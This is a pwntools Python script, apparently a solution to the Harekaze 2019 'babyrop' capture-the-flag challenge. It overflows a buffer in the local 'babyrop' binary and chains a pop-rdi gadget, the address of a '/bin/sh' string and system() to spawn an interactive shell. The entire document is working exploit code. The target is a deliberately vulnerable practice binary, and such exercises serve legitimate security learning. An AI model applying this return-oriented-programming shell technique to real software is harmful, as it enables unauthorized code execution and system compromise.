# Harekaze 2019 babyrop
from pwn import *

_system = p64(0x00400490)
_binsh = p64(0x00601048)
_poprdi = p64(0x00400683)

payload = b"A" * 16 + b"rbp4rbp8"
payload += _poprdi
payload += _binsh
payload += _system

p = process('babyrop')
p.read()
p.sendline(payload)
p.interactive()
